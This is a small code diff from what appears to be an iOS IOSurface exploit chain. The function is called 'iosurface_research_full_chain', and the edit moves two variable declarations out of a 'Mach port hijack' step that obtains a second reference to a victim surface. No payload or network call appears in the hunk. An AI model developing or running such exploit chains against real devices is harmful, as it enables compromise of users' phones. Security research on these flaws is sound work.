@@ -8522,11 +8522,12 @@ void iosurface_research_full_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnu
 
             log([NSString stringWithFormat:@"CHAIN: Victim surface ID=%u, plane0=%p plane1=%p", victimID, plane0, plane1]);
 
+            mach_port_t hijackPort = MACH_PORT_NULL;
+            IOSurfaceRef hijackRef = NULL;
+
             if (!isr_stopped()) {
             // Step 2: Mach port hijack — get second reference
             log(@"CHAIN: Step 2 — Mach port hijack for second reference");
-            mach_port_t hijackPort = MACH_PORT_NULL;
-            IOSurfaceRef hijackRef = NULL;
             if (createPort && lookupPort) {
                 hijackPort = createPort(victimSurf);
                 if (hijackPort != MACH_PORT_NULL) {
